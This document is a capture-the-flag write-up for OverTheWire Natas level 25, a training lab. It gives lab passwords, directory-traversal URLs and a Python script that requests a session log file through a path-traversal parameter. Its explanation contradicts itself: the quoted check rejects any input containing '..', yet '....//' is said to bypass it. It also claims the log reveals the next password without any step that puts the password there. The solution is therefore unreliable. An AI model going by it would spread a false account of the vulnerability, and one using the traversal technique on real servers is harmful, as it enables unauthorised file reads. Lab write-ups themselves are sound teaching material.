# Natas CTF Solutions  

## Natas Level 25  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Use **directory traversal** to read the log file containing the password.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas25.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas25`  
- **Password:** Use the password from Natas Level 24:  
```
ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
```  

![Home_Page](https://github.com/user-attachments/assets/b8849264-de23-4b04-a496-1a7ddee7608d)

---

### **Step 3: Analyze the Source Code**  
Key part of the code:  
```php
if(strstr($language, "..")) {
    print "Error: Illegal characters in language";
} else {
    include "languages/" . $language;
}
```

### **Understanding the Vulnerability**  
- The code tries to prevent directory traversal using `strstr($language, "..")`.  
- However, `....//` bypasses the check since `strstr()` only looks for `..` directly.  

![Source_Code](https://github.com/user-attachments/assets/c941a655-9e4e-42fd-8056-4155d4a1bd3a)

---

### **Step 4: Trigger Directory Traversal**  
To bypass the filter, use this payload:  
```http
http://natas25.natas.labs.overthewire.org/?lang=....//
```
➡️ This creates an error log at:  
```  
/var/www/natas/natas25/logs/natas25_<session_id>.log  
```

![Error](https://github.com/user-attachments/assets/008e052b-a7ab-4c4b-8f91-6a279f04cde6)

---

### **Step 5: Locate the Log File**  
1. Check cookies for `PHPSESSID`.  
2. Use directory traversal to access the log file:  

```http
http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_<session_id>.log
```

✅ Example in Python:  
```python
import requests
from requests.auth import HTTPBasicAuth

username = "natas25"
password = "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws"
url = "http://natas25.natas.labs.overthewire.org"

# Generate log file by triggering the error
payload = {'lang': '....//'}
session = requests.Session()
session.auth = (username, password)
session.get(url, params=payload)

# Read the log file
session_id = session.cookies['PHPSESSID']
log_file = f"....//....//....//....//....//var/www/natas/natas25/logs/natas25_{session_id}.log"
response = session.get(url, params={'lang': log_file})
print(response.text)
```

---

### **Step 6: Output**  
If successful, the output will reveal the password for the next level:  
```  
The password for natas26 is: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE  
```  

![Output](https://github.com/user-attachments/assets/26a35ee9-b49f-4b15-be39-bb920ff7e959)

---

### **✅ Password for Natas Level 26**  
```
cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
```  

---

## 💡 **Lessons Learned**  
✔️ **Directory Traversal:** `strstr()` filter can be bypassed using double encoding or alternative patterns like `....//`.  
✔️ **Log File Injection:** Errors can generate log files that may expose sensitive information.  
✔️ **Session ID Use:** Log file names based on session IDs can create predictable attack vectors.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Source Code | ![Source_Code](https://github.com/user-attachments/assets/c941a655-9e4e-42fd-8056-4155d4a1bd3a) |  
| Step 5 – Found Password | ![image](https://github.com/user-attachments/assets/8030f399-90c5-4081-88e1-5a745d8e2cf9) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 26**:  
👉 [http://natas26.natas.labs.overthewire.org](http://natas26.natas.labs.overthewire.org)  

---
